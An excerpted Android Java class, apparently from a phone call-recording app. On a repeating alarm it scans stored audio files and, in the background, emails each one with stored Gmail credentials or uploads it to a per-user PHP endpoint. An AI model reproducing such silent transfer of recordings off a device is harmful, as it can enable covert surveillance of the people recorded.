...
public class RepeatingAlarmServiceAudio extends BroadcastReceiver {
    ...
    void someTask(Context context) {
        ...
        serviceaudio = dh.selectServiceaudio("1");
        dh = null;
        if(serviceaudio.length()>0) {
            ...
            if (sdPath.exists()) {
                ...
                for (int i = 0; i < images.length; i++) {
                    ...
                    //        new SendFile().execute("" + sdPath, filename, URL_HTTP, email);
                            ...
                            new SendMailTask().execute(email,password, toEmailList, "record phone email", "phone","",filename);
                            dh.InsertNameaudiofile(filename);
                    //      Toast.makeText(context.getApplicationContext(), " " + sdPath+" "+filename+" "+URL_HTTP+" "+email, Toast.LENGTH_LONG).show();
                                           }

        //    Toast.makeText(context.getApplicationContext(), " " + sdPath+" "+filename+" "+password+" "+email, Toast.LENGTH_LONG).show();
    ...
    public class SendMailTask extends AsyncTask {
        ...
        protected Object doInBackground(Object... args) {
            try {
                GMailTo androidEmail = new GMailTo(args[0].toString(),args[1].toString(), (List) args[2], args[3].toString(),args[4].toString(),args[5].toString(),args[6].toString());
    ...
    public class SendFile extends AsyncTask<String, String, String> {
        ...
        protected String doInBackground(String... params)
        {
            ...
            try {
                ...
                URL url = new URL(params[2]+"/user_"+emailmodify+"/audiophoneto/upload.php");
